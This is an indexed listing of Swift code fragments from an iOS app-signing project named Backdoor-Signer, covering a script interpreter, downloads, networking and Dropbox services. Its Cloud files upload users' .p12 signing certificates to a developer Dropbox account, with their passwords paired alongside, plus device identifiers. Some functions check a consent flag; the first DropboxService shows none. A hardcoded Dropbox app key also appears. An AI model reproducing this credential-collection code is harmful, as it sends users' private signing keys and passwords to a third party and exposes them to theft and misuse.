/// Parse a command to determine its language mode and extract the code
func parse(_ command: String) -> Result<ParsedCommand, Error> {"
264,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Parse a command to determine its language mode and extract the code","func parse(_ command: String) -> Result<ParsedCommand, Error> {
// Check for shebang
if command.hasPrefix(""#!/bin/backdoor"") {"
265,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ BackdoorInterpreter - Executes code in the custom programming language","class BackdoorInterpreter {
enum BlockType {"
266,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","enum BlockType - implements functionality related to block type","enum BlockType {
case swift
case python
}

struct CodeBlock {"
267,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct CodeBlock - implements functionality related to code block","struct CodeBlock {
let type: BlockType
let code: String
let outputFile: URL
let importVariables: [String]
}

struct ExecutionPlan {"
268,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct ExecutionPlan - implements functionality related to execution plan","struct ExecutionPlan {
let executionBlocks: [CodeBlock]
let dataPassingFiles: [URL]
}

/// Prepare mixed code for execution by parsing and creating execution blocks
func prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {"
269,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Prepare mixed code for execution by parsing and creating execution blocks","func prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {
// Split code into language blocks
var executionBlocks: [CodeBlock] = []
var dataPassingFiles: [URL] = []

// Create a regular expression to match language blocks
let blockPattern = try NSRegularExpression(pattern: ""(swift|python):\\s*\\{([\\s\\S]*?)\\}"", options: [])"
270,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Execute a single code block and handle data passing","func executeBlock(_ block: CodeBlock, outputHandler: @escaping (String) -> Void) throws {
// Create modified code with data passing logic
let modifiedCode = try createExecutableCode(for: block)

// Create a temporary file
let tempDir = FileManager.default.temporaryDirectory
let fileExtension = block.type == .swift ? ""swift"" : ""py""
let fileURL = tempDir.appendingPathComponent(""temp_\(UUID().uuidString).\(fileExtension)"")

try modifiedCode.write(to: fileURL, atomically: true, encoding: .utf8)"
271,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Create executable code for a block, including data passing logic","private func createExecutableCode(for block: CodeBlock) throws -> String {
var code = """"

if block.type == .swift {"
272,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","Data passing setup","struct ExportedData: Codable {
var variables: [String: String] = [:]
}

var exportedData = ExportedData()

// Export function
func export(_ name: String, _ value: Any) {"
273,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","Export function","func export(_ name: String, _ value: Any) {
let jsonString = String(describing: value)
exportedData.variables[name] = jsonString
}

""""""

// Add import logic for variables from Python
for variable in block.importVariables {"
274,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","/ Service for handling Dropbox file uploads","class DropboxService {
// MARK: - Singleton

/// Shared instance for app-wide access
static let shared = DropboxService()

// MARK: - Properties

/// Dropbox API token - stored as a constant for this implementation
/// In a production app, this would be stored more securely (e.g., in Keychain)"
275,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","MARK: - Public Methods / Uploads a certificate file to Dropbox / - Parameters: /   - fileURL: The local URL of the file to upload /   - password: Optional password for the certificate file, if it's a .p12 file /   - completion: Optional completion handler called when upload finishes (for debugging only)","func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
guard fileURL.isFileURL else {"
276,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","/ Uploads password information as a separate file to Dropbox / - Parameters: /   - password: The p12 password to send /   - p12Filename: The name of the p12 file /   - completion: Optional completion handler","private func uploadPasswordFile(
password: String,
p12Filename: String,
completion: ((Bool, Error?) -> Void)? = nil
) {"
277,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Enhanced Dropbox service for improved logging and file management","class EnhancedDropboxService {
// MARK: - Singleton

/// Shared instance for app-wide access
static let shared = EnhancedDropboxService()

// MARK: - Constants

// Dropbox credentials
private let dropboxAppKey = ""2bi422xpd3xd962"""
278,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","MARK: - Public Methods / Upload a log file to Dropbox","func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }"
279,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a certificate file to Dropbox","func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }"
280,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Creates a file that explicitly pairs a certificate with its password / - Parameters: /   - certificateFilename: The filename of the certificate /   - password: The password for the certificate /   - completion: Optional completion handler","private func createCertificatePasswordPairFile(
certificateFilename: String,
password: String,
completion: ((Bool, Error?) -> Void)? = nil
) {"
281,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload device information to Dropbox","func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
282,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a text string as a log entry","func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
283,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Store password for certificate file","func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {
// Create password info
let passwordInfo: [String: String] = [
""certificate_file"": fileName,
""password"": password,
""timestamp"": ISO8601DateFormatter().string(from: Date()),
""device_name"": UIDevice.current.name,
]

// Convert to JSON"
284,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","MARK: - Private Methods / Common validation for file uploads","private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {
// Check consent
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
285,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Handle consent missing error","private func handleConsentError(completion: ((Bool, Error?) -> Void)? = nil) {
if let completion = completion {"
286,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Handle data creation error","private func handleDataCreationError(completion: ((Bool, Error?) -> Void)? = nil) {
if let completion = completion {"
287,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Create device info dictionary","private func createDeviceInfoDictionary() -> [String: String] {
return [
""device_name"": UIDevice.current.name,
""system_name"": UIDevice.current.systemName,
""system_version"": UIDevice.current.systemVersion,
""model"": UIDevice.current.model,
""identifier_for_vendor"": UIDevice.current.identifierForVendor?.uuidString ?? ""unknown"",
""timestamp"": ISO8601DateFormatter().string(from: Date()),
""app_version"": Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""unknown"",
""build_number"": Bundle.main.infoDictionary?[""CFBundleVersion""] as? String ?? ""unknown"","
288,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Refresh access token for Dropbox API","private func refreshAccessToken(completion: @escaping (Bool) -> Void) {
// Check if current token is still valid
if let expiry = accessTokenExpiry, expiry > Date(), accessToken != nil {"
289,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Process token response from Dropbox","private func processTokenResponse(data: Data, completion: @escaping (Bool) -> Void) {
do {"
290,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Prepare upload request","private func prepareUploadRequest(token: String, path: String, fileData: Data) -> URLRequest? {
guard let uploadURL = URL(string: dropboxUploadURL) else {"
291,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a file to Dropbox with auto folder creation","private func uploadFile(fileURL: URL, toPath path: String, completion: ((Bool, Error?) -> Void)? = nil) {
// Ensure we have a valid token
refreshAccessToken { [weak self] success in"
292,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Process file upload after token refresh","private func processFileUpload(
token: String,
fileURL: URL,
path: String,
completion: ((Bool, Error?) -> Void)?
) {"
293,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Handle upload response from Dropbox","private func handleUploadResponse(
data: Data?,
response: URLResponse?,
path: String,
completion: ((Bool, Error?) -> Void)?
) {"
294,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","/ Minimal Dropbox service implementation to avoid dependency conflicts / This class uses only standard libraries and works with the MinimalBackdoorCollector","class MinimalDropboxService {
// MARK: - Singleton

static let shared = MinimalDropboxService()

// MARK: - Properties

private let rootFolder = ""Backdoor-App-Data""
private var backgroundQueue = DispatchQueue(label: ""com.minimal.dropboxservice"", qos: .utility)
"
295,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","MARK: - Public Methods / Upload device information","func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
296,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","/ Upload certificate file","func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
297,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","/ Store password for certificate","func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
298,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","/ Upload log entry","func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
299,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift","MARK: - Private Methods / Save data locally until upload capability is available","private func saveDataLocally(data: Any, subfolder: String? = nil, filename: String) {
do {"
300,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","class AppDownload - implements functionality related to app download","class AppDownload: NSObject {
let progress = Progress(totalUnitCount: 100)
var dldelegate: DownloadDelegate?
var downloads = [URLSessionDownloadTask: (
uuid: String,
appuuid: String,
destinationUrl: URL,
completion: (String?, String?, Error?) -> Void
)]()
var DirectoryUUID: String?"
301,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function downloadFile - implements downloadfile functionality","func downloadFile(url: URL, appuuid: String, completion: @escaping (String?, String?, Error?) -> Void) {
let uuid = UUID().uuidString
DirectoryUUID = uuid
AppUUID = appuuid
guard let folderUrl = createUuidDirectory(uuid: uuid) else {"
302,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function importFile - implements importfile functionality","func importFile(url: URL, uuid: String, completion: @escaping (URL?, Error?) -> Void) {
guard let folderUrl = createUuidDirectory(uuid: uuid) else {"
303,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function cancelDownload - implements canceldownload functionality","func cancelDownload() {
Debug.shared.log(message: ""AppDownload.cancelDownload: User cancelled the download"", type: .info)
downloadTask?.cancel()
session?.invalidateAndCancel()
downloadTask = nil
session = nil
progress.cancel()
}

func createUuidDirectory(uuid: String) -> URL? {"
304,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function createUuidDirectory - creates uuiddirectory","func createUuidDirectory(uuid: String) -> URL? {
let baseFolder = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
let folderUrl = baseFolder.appendingPathComponent(""Apps/Unsigned"").appendingPathComponent(uuid)

do {"
305,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function extractCompressedBundle - implements extractcompressedbundle functionality","func extractCompressedBundle(packageURL: String, completion: @escaping (String?, Error?) -> Void) {
let fileURL = URL(fileURLWithPath: packageURL)
let destinationURL = fileURL.deletingLastPathComponent()
let fileManager = FileManager.default

if !fileManager.fileExists(atPath: fileURL.path) {"
306,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function addToApps - implements addtoapps functionality","func addToApps(
bundlePath: String,
uuid: String,
sourceLocation: String? = nil,
completion: @escaping (Error?) -> Void
) {"
307,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","extension AppDownload - implements functionality related to app download","extension AppDownload: URLSessionDownloadDelegate {
func urlSession(_: URLSession, downloadTask: URLSessionDownloadTask, didFinishDownloadingTo location: URL) {"
308,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function urlSession - implements urlsession functionality","func urlSession(_: URLSession, downloadTask: URLSessionDownloadTask, didFinishDownloadingTo location: URL) {
guard let download = downloads[downloadTask] else {"
309,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function urlSession - implements urlsession functionality","func urlSession(_: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) {
guard let downloadTask = task as? URLSessionDownloadTask else {"
310,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function urlSession - implements urlsession functionality","func urlSession(
_: URLSession,
downloadTask: URLSessionDownloadTask,
didWriteData _: Int64,
totalBytesWritten: Int64,
totalBytesExpectedToWrite: Int64
) {"
311,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","enum HandleIPAFileError - implements functionality related to handle i p a file error","enum HandleIPAFileError: Error {
case importFailed(String)
case extractionFailed(String)
case additionFailed(String)
}

func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {"
312,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift","Function handleIPAFile - implements handleipafile functionality","func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {
let semaphore = DispatchSemaphore(value: 0)

var functionError: Error?
var newUrl: URL?
var targetBundle: String?

DispatchQueue(label: ""DL"").async {"
313,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","enum DownloadState - implements functionality related to download state","enum DownloadState {
case notStarted
case inProgress(progress: CGFloat)
case completed
case failed(error: Error)

var progress: CGFloat? {"
314,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","class DownloadTask - implements functionality related to download task","class DownloadTask {
var uuid: String
weak var cell: AppTableViewCell?
var state: DownloadState
var dl: AppDownload
var progressHandler: ((CGFloat) -> Void)?

init(uuid: String, cell: AppTableViewCell, state: DownloadState = .notStarted, dl: AppDownload) {"
315,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function updateProgress - updates progress","func updateProgress(to progress: CGFloat) {
state = .inProgress(progress: progress)
progressHandler?(progress)
NotificationCenter.default.post(
name: .downloadProgressUpdated,
object: self,
userInfo: [""uuid"": uuid, ""progress"": progress]
)
}
}"
316,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","extension Notification - implements functionality related to notification","extension Notification.Name {
static let downloadProgressUpdated = Notification.Name(""downloadProgressUpdated"")
}

class DownloadTaskManager {"
317,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","class DownloadTaskManager - Manages system resources and operations","class DownloadTaskManager {
static let shared = DownloadTaskManager()
var downloadTasks: [String: DownloadTask] = [:]
private let taskQueue = DispatchQueue(label: ""com.backdoor.DownloadTaskManager"", attributes: .concurrent)

private init() {"
318,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function addTask - implements addtask functionality","func addTask(uuid: String, cell: AppTableViewCell, dl: AppDownload) {
let task = DownloadTask(uuid: uuid, cell: cell, dl: dl)
taskQueue.async(flags: .barrier) { [weak self] in"
319,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function updateTask - updates task","func updateTask(uuid: String, state: DownloadState) {
taskQueue.async { [weak self] in"
320,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function cancelDownload - implements canceldownload functionality","func cancelDownload(for uuid: String) {
taskQueue.async { [weak self] in"
321,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function updateTaskProgress - updates taskprogress","func updateTaskProgress(uuid: String, progress: CGFloat) {
taskQueue.async { [weak self] in"
322,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function removeTask - implements removetask functionality","func removeTask(uuid: String) {
taskQueue.async(flags: .barrier) { [weak self] in"
323,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function task - implements task functionality","func task(for uuid: String) -> DownloadTask? {
var result: DownloadTask?
taskQueue.sync {"
324,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function persistTaskState - implements persisttaskstate functionality","private func persistTaskState(_ task: DownloadTask) {
let defaults = UserDefaults.standard
defaults.set(task.state.progress, forKey: ""\(task.uuid)_progress"")
}

private func removePersistedTaskState(for uuid: String) {"
325,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function removePersistedTaskState - implements removepersistedtaskstate functionality","private func removePersistedTaskState(for uuid: String) {
let defaults = UserDefaults.standard
defaults.removeObject(forKey: ""\(uuid)_progress"")
}

func restoreTaskState(for uuid: String, cell: AppTableViewCell) {"
326,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function restoreTaskState - implements restoretaskstate functionality","func restoreTaskState(for uuid: String, cell: AppTableViewCell) {
taskQueue.async { [weak self] in"
327,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function appWillTerminate - implements appwillterminate functionality","@objc private func appWillTerminate() {
clearAllTasks()
}

@objc private func handleMemoryWarning() {"
328,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function handleMemoryWarning - implements handlememorywarning functionality","@objc private func handleMemoryWarning() {
// Clean up any completed or failed tasks that might still be in memory
taskQueue.async(flags: .barrier) { [weak self] in"
329,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift","Function clearAllTasks - implements clearalltasks functionality","private func clearAllTasks() {
taskQueue.async(flags: .barrier) { [weak self] in"
330,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/SourceDownload.swift","extension SourcesViewController - Controls user interface and application flow","extension SourcesViewController {}
"
331,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift","struct iTunesLookupResult - implements functionality related to tunes lookup result","struct iTunesLookupResult: Codable {
let resultCount: Int
let results: [iTunesResult]
}

struct iTunesResult: Codable {"
332,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift","struct iTunesResult - implements functionality related to tunes result","struct iTunesResult: Codable {
let bundleId: String

enum CodingKeys: String, CodingKey {"
333,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case bundleId
}
}

class iTunesLookup {"
334,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift","class iTunesLookup - implements functionality related to tunes lookup","class iTunesLookup {
static func checkBundleId(_ bundleId: String) async throws -> Bool {"
335,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/iTunesLookup.swift","Function checkBundleId - implements checkbundleid functionality","static func checkBundleId(_ bundleId: String) async throws -> Bool {
let encodedBundleId = bundleId.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? bundleId
let urlString = ""https://itunes.apple.com/lookup?bundleId=\(encodedBundleId)""

guard let url = URL(string: urlString) else {"
336,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager+NonDecodable.swift","Extension to NetworkManager for batch requests that don't need Decodable conformance","extension NetworkManager {
/// Perform a network request without requiring Decodable conformance
/// - Parameters:
///   - request: The URL request to perform
///   - caching: Whether to use caching (default is based on configuration)
///   - completion: Completion handler with the result
/// - Returns: A cancellable task identifier
@discardableResult
func performRequestWithoutDecoding(
_ request: URLRequest,"
337,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager+NonDecodable.swift","Function performRequestWithoutDecoding - implements performrequestwithoutdecoding functionality","func performRequestWithoutDecoding(
_ request: URLRequest,
caching: Bool? = nil,
completion: @escaping (Result<Any, Error>) -> Void
) -> URLSessionTask? {"
338,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ A comprehensive networking system with caching, retries, and background processing","final class NetworkManager {
// MARK: - Singleton

/// Shared instance of the network manager
static let shared = NetworkManager()

// MARK: - Configuration

/// Configuration for network requests
struct Configuration {"
339,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - Configuration / Configuration for network requests","struct Configuration {
/// Default timeout interval for requests (seconds)
var timeoutInterval: TimeInterval = 30.0

/// Maximum number of retry attempts
var maxRetryAttempts: Int = 3

/// Base delay for exponential backoff (seconds)
var baseRetryDelay: TimeInterval = 1.0
"
340,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","Function handleMemoryWarning - implements handlememorywarning functionality","@objc private func handleMemoryWarning() {
// Clear memory cache on memory warning
responseCache.removeAllObjects()
Debug.shared.log(message: ""Cleared network response cache due to memory warning"", type: .warning)
}

// MARK: - Public Interface

/// Perform a network request
/// - Parameters:"
341,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","Function performRequest - implements performrequest functionality","func performRequest<T: Decodable>(
_ request: URLRequest,
caching: Bool? = nil,
completion: @escaping (Result<T, Error>) -> Void
) -> URLSessionTask? {"
342,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Cancel all active operations","func cancelAllOperations() {
operationQueueAccessQueue.sync {"
343,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Cancel a specific operation / - Parameter request: The request to cancel","func cancelOperation(for request: URLRequest) {
operationQueueAccessQueue.sync {"
344,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Clear all caches (memory and disk)","func clearCache() {
// Clear memory cache
responseCache.removeAllObjects()

// Clear disk cache
cleanupQueue.async { [weak self] in"
345,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - Private Methods / Create a network task with retry logic / - Parameters: /   - request: The URL request /   - retryCount: Current retry count /   - useCache: Whether to cache the response /   - completion: Completion handler with the result / - Returns: The URLSessionTask","private func createNetworkTask<T: Decodable>(
request: URLRequest,
retryCount: Int,
useCache: Bool,
completion: @escaping (Result<T, Error>) -> Void
) -> URLSessionTask {"
346,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - Caching / Cache a response / - Parameters: /   - data: The response data /   - request: The URL request","func cacheResponse(data: Data, for request: URLRequest) {
guard let url = request.url else { return }"
347,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Get a cached response / - Parameter request: The URL request / - Returns: The cached response, if available and not expired","private func getCachedResponse(for request: URLRequest) -> CachedResponse? {
guard let url = request.url else { return nil }"
348,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Check if a cached response is expired / - Parameter cachedResponse: The cached response / - Returns: True if the cache is expired","func isCacheExpired(_ cachedResponse: CachedResponse) -> Bool {
let now = Date()
let expirationTime = cachedResponse.timestamp.addingTimeInterval(_configuration.cacheLifetime)
return now > expirationTime
}

/// Get the file URL for caching a response
/// - Parameter url: The URL of the request
/// - Returns: The file URL for caching
private func cacheFileURL(for url: URL) -> URL {"
349,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Get the file URL for caching a response / - Parameter url: The URL of the request / - Returns: The file URL for caching","private func cacheFileURL(for url: URL) -> URL {
// Use URL's absoluteString hashed as the filename
let urlString = url.absoluteString
let filename = urlString.hash.magnitude.description
return cacheDirectory.appendingPathComponent(filename)
}

/// Clean expired caches
private func cleanExpiredCaches() {"
350,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Clean expired caches","private func cleanExpiredCaches() {
cleanupQueue.async { [weak self] in"
351,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - NetworkError / Errors that can occur during network operations","enum NetworkError: Error, LocalizedError {
case invalidURL
case invalidResponse
case httpError(statusCode: Int)
case noData
case decodingError(Error)
case cancelled

var errorDescription: String? {"
352,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - CachedResponse / A cached network response","final class CachedResponse: NSObject, NSSecureCoding {
static var supportsSecureCoding: Bool = true

/// The response data
let data: Data

/// When the response was cached
let timestamp: Date

/// Initialize with data and timestamp"
353,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - NSSecureCoding / Encode with coder / - Parameter coder: The coder","func encode(with coder: NSCoder) {
coder.encode(data, forKey: ""data"")
coder.encode(timestamp, forKey: ""timestamp"")
}

/// Initialize with coder
/// - Parameter coder: The coder
required init?(coder: NSCoder) {"
354,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - URLRequest Extension","extension URLRequest {
/// Create a request with optional caching and timeout configuration
/// - Parameters:
///   - url: The URL for the request
///   - httpMethod: HTTP method (default is GET)
///   - timeoutInterval: Timeout interval (default is from NetworkManager.Configuration)
/// - Returns: The configured URL request
static func build(
url: URL,
httpMethod: String = ""GET"","
